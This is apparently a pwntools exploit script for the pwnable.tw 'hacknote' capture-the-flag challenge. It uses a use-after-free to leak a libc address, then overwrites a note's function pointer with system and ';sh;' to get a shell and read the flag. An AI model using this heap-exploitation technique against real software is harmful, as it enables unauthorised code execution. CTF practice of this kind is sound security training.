#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("hacknote_patched")
libc = elf.libc

local = True 
if local:
    p = process("./hacknote_patched")
    gdb.attach(p,'''
    c
    ''')
else:
    p = remote('chall.pwnable.tw', 10102)

elf = context.binary = ELF('./hacknote_patched', checksec=False)

def create(size, data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Note size :", str(size))
    p.sendlineafter(b"Content :", data)
    print("\n[*]Create: Done")

def free(idx):
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index :", str(idx))
    print("\n[*]Free: Done")

def show(idx):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", str(idx))

create(123,b"a"*123)
create(123,b"b"*123)
free(0)

create(123,b"BBBB")
show(0)
p.recvuntil(b"BBBB")
leak = int.from_bytes(p.recv(4),"little") - 1771274
system = leak + 0x3a940
print("[+]Libc_base:    ", hex(leak))
print("[+]Libc_system:  ", hex(system))

free(0)
free(1)

create(123, p32(system) + b";sh;")

show(0)
if local: 
    p.sendline(b"id")
else:
    p.sendline(b"cd home/hacknote")
    p.sendline(b"cat flag")

p.interactive()